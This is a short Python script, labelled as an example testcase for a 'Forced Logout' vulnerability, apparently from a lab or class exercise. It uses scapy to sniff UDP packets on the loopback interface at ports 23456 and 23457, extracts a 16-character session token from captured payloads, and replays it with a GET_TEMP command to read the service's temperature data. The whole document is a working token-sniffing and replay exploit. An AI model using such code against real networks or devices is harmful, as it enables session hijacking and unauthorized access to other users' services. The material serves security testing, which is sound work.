#This is just an example of a testcase
#Vulnerability Name - Forced Logout
import socket
from scapy.all import *

def print_pkt(pkt):

    payload = pkt["Raw"].load.decode("utf-8")

    token = payload.split(";")[0]

    if len(token) == 16 and (pkt["UDP"].dport == 23456 or pkt["UDP"].dport == 23457):
        #print("TOKEN HERE: " + str(token))

        with socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) as s:
            execute = "%s;GET_TEMP" % token
            s.sendto(execute.encode("utf-8"),("127.0.0.1", pkt["UDP"].dport))
            msg, addr = s.recvfrom(1024)
            print(str(pkt["UDP"].dport) + " -- TEMP READING: " + str(msg.strip().decode("utf-8")))
            

pkt = sniff(iface="lo",filter="udp and (port 23456 or port 23457)", prn=print_pkt)
